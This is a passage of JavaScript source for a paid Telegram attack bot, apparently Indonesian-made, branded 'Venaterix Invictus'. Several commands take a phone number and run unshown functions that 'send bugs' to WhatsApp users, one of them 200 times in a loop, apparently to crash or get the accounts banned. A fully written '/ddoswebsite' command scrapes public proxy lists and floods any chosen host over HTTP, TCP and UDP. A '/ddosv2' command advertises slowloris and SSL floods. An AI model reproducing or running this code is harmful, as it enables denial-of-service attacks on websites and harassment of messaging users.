    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crot
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crot
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await combo(jid);
         
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: Crot
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/VenaUi (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaUi
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaUi
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await Blank(jid);
         
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaUi
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/DenixVena (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: DenixVena
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: DenixVena
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await delay(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: DenixVena
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/bannirs (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/VinxzGanteng" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/au2sek.jpg", {
      caption: `
\`\`\`
- X - VnxzTr4sh System
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "◇ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- X - VnxzTr4sh System
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 200; i++) {   
   await Banned(target);
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- X - VnxzTr4sh System
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/VenaBlank (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung goblok🤓. gunakan cmd /connect terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaBlank
✵ Status: Waiting...
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaBlank
✵ Status: Sending bug
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}`, style : "danger" }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await Blank(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
✵ Target: ${formattedNumber}
✵ Type: VenaBlank
✵ Status: Successfuly
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Ｃ Ｅ Ｋ 𖤓 Ｔ Ａ Ｒ Ｇ Ｅ Ｔ", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/ddoswebsite (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(" ");
    
    if (args.length < 4) {
        return bot.sendMessage(chatId, "🪧 ☇ Format: /ddoswebsite [target] [port] [threads] [duration]");
    }
    
    const target = args[0];
    const port = parseInt(args[1]) || 80;
    const threads = parseInt(args[2]) || 100;
    const duration = parseInt(args[3]) || 60;
    
    try {
      const processMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/uxyyad.png", {
          caption: `
<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Starting
 
© zephyrinē sદx
`,
          parse_mode: "HTML",
          reply_markup: {
              inline_keyboard: [[
                  { text: "⌜🌍⌟ ☇ ターゲットを確認", url: `https://${target}` }
              ]]
          }
      });
      
      await bot.editMessageCaption(`<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Collecting Proxies
 ◉ Proxies: 0
 
© zephyrinē sદx
`, {
        chat_id: chatId,
        message_id: processMessage.message_id,
        parse_mode: "HTML"
      });
      
      const proxySources = [
          "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
          "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
          "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
          "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
          "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
          "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
          "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
          "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
          "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
          "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
          "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
          "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
          "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
          "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
          "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
          "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
          "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=5000",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
          "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
          "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
          "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
          "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
          "https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt"
      ];
      
      let proxyList = [];
      const https = require('https');
      
      async function fetchProxies(url) {
          return new Promise((resolve) => {
              https.get(url, (res) => {
                  let data = '';
                  res.on('data', (chunk) => data += chunk);
                  res.on('end', () => {
                      const proxies = data.split('\n')
                          .map(line => line.trim())
                          .filter(line => line.includes(':') && line.split(':').length === 2)
                          .map(line => {
                              const [host, port] = line.split(':');
                              return { host, port: parseInt(port) };
                          });
                      resolve(proxies);
                  });
                  res.on('error', () => resolve([]));
              }).setTimeout(5000).on('timeout', () => resolve([]));
          });
      }
      
      for (const source of proxySources) {
          try {
              const proxies = await fetchProxies(source);
              proxyList.push(...proxies);
              
              await bot.editMessageCaption(`<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Collecting Proxies
 ◉ Proxies: ${proxyList.length}
 
© zephyrinē sદx
`, {
                chat_id: chatId,
                message_id: processMessage.message_id,
                parse_mode: "HTML"
              });
          } catch (e) {}
      }
      
      if (proxyList.length === 0) {
          proxyList = [{ host: target, port: port }];
      }
      
      let attackActive = true;
      let packetsSent = 0;
      let startTime = Date.now();
      const net = require('net');
      const dgram = require('dgram');
      
      await bot.editMessageCaption(`<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Running
 ◉ Proxies: ${proxyList.length}
 ◉ Packets: ${packetsSent}
 
© zephyrinē sદx
`, {
        chat_id: chatId,
        message_id: processMessage.message_id,
        parse_mode: "HTML"
      });
      
      function httpFloodWithProxy(proxy) {
          const http = require('http');
          const options = {
              hostname: proxy.host,
              port: proxy.port || 80,
              path: `http://${target}:${port}/`,
              method: 'GET',
              headers: {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Connection': 'keep-alive',
                  'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
              },
              timeout: 5000
          };
          
          const req = http.request(options, (res) => {
              packetsSent++;
              res.on('data', () => {});
          });
          req.on('error', () => {});
          req.setTimeout(5000);
          req.end();
      }
      
      function tcpFlood() {
          const socket = new net.Socket();
          socket.connect(port, target, () => {
              socket.write(Buffer.alloc(65500));
              packetsSent++;
          });
          socket.on('error', () => socket.destroy());
          socket.setTimeout(5000, () => socket.destroy());
      }
      
      function udpFlood() {
          const client = dgram.createSocket('udp4');
          const message = Buffer.alloc(65500);
          client.send(message, port, target, (err) => {
              if (!err) packetsSent++;
              client.close();
          });
      }
      
      const attackTypes = [httpFloodWithProxy, tcpFlood, udpFlood];
      
      const attackInterval = setInterval(() => {
          if (!attackActive || (Date.now() - startTime) > (duration * 1000)) {
              clearInterval(attackInterval);
              attackActive = false;
              
              const totalTime = Math.floor((Date.now() - startTime) / 1000);
              
              // PERBAIKAN: Hindari pembagian dengan 0
              const avgRPS = totalTime > 0 ? Math.floor(packetsSent / totalTime) : 0;
              
              // PERBAIKAN: Parameter yang benar
              bot.editMessageCaption(`<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Complete
 ◉ Proxies Used: ${proxyList.length}
 ◉ Total Packets: ${packetsSent.toLocaleString()}
 ◉ Attack Time: ${totalTime}s
 ◉ Average RPS: ${avgRPS}/s
 
© zephyrinē sદx
`, {
                chat_id: chatId,
                message_id: processMessage.message_id,
                parse_mode: "HTML"
              });
              return;
          }
          
          for (let i = 0; i < threads; i++) {
              const attackFunc = attackTypes[Math.floor(Math.random() * attackTypes.length)];
              try {
                  if (attackFunc === httpFloodWithProxy) {
                      const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
                      if (proxy) httpFloodWithProxy(proxy);
                  } else {
                      attackFunc();
                  }
              } catch (e) {}
          }
          
          if (packetsSent % (threads * 10) === 0) {
              bot.editMessageCaption(`<pre>( 𖣂 ) ＶＥＮＡＴＥＲＩＸ° ＩＮＶＩＣＴＵＳ°</pre>
🥀 - Telegram || 私は誰かにウイルスを送信できるボットです。私を最大限に活用し、無罪の人々に危害を加えないでください。
━━━━━━━━━━━━━━━

🦋 - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏
 ◉ Author: Zephyrine
 ◉ Version: 1.0 VIP
 ◉ Language: JavaScript
 ◉ Prefix: /

☠️ - 𝑫𝑫𝑶𝑺 𝑨𝒕𝒕𝒂𝒄𝒌
 ◉ Target: ${target}
 ◉ Port: ${port}
 ◉ Threads: ${threads}
 ◉ Duration: ${duration}s
 ◉ Status: Running
 ◉ Proxies: ${proxyList.length}
 ◉ Packets: ${packetsSent.toLocaleString()}
 ◉ Time Left: ${Math.max(0, duration - Math.floor((Date.now() - startTime) / 1000))}s
 
© zephyrinē sદx
`, {
                chat_id: chatId,
                message_id: processMessage.message_id,
                parse_mode: "HTML"
              });
          }
      }, 100);
      
      setTimeout(() => {
          attackActive = false;
      }, duration * 1000);
      
    } catch (error) {
        console.error("Error in ddos command:", error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});
bot.onText(/\/ddosv2 (.+)/, async (msg, match) => {
    const args = match[1].split(" ");
    if (args.length < 4) {
        return bot.sendMessage(msg.chat.id, `
🎌 𝓐𝓭𝓿𝓪𝓷𝓬𝓮𝓭 𝓓𝓓𝓞𝓢 𝓥2 🎌

━━━━━━━━━━━━━━━
🔧 𝙐𝙨𝙖𝙜𝙚:
/ddosv2 [target] [port] [threads] [duration] [method]

━━━━━━━━━━━━━━━
📁 𝙈𝙚𝙩𝙝𝙤𝙙𝙨:
• HTTP - Standard HTTP flood
• TCP - Raw TCP packets
• UDP - UDP amplification
• SSL - SSL/TLS handshake flood
• SLOW - Slowloris attack
• MIXED - All methods combined

━━━━━━━━━━━━━━━
🎯 𝙀𝙭𝙖𝙢𝙥𝙡𝙚𝙨:
/ddosv2 example.com 80 500 120 MIXED
/ddosv2 192.168.1.1 443 1000 300 SSL
        `, { parse_mode: "HTML" });
    }
    
    const rawTarget = args[0];
    const target = rawTarget.replace(/https?:\/\//, '').split('/')[0];
    const port = parseInt(args[1]) || 80;
    const threads = Math.min(parseInt(args[2]) || 500, 3000);
    const duration = Math.min(parseInt(args[3]) || 120, 600);
    const method = (args[4] || "MIXED").toUpperCase();
    
    if (!isValidTarget(target)) {
        return bot.sendMessage(msg.chat.id, "❌ Invalid target format. Use domain or IP address.");
    }
    
    if (port < 1 || port > 65535) {
        return bot.sendMessage(msg.chat.id, "❌ Invalid port number (1-65535).");
    }

    const attackMessage = await bot.sendMessage(msg.chat.id, `
⚠️ <b>REAL DDoS ATTACK INITIATED</b> ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${target}:${port}</code>
🔧 <b>Method:</b> ${method}
⚡ <b>Threads:</b> ${threads}
⏱️ <b>Duration:</b> ${duration}s
━━━━━━━━━━━━━━━━━━━━━━━
📡 <b>Status:</b> Starting REAL attack...
💀 <b>Warning:</b> This is a REAL attack
    `, { parse_mode: "HTML" });

    try {
        const attackController = new RealDDoSAttack({
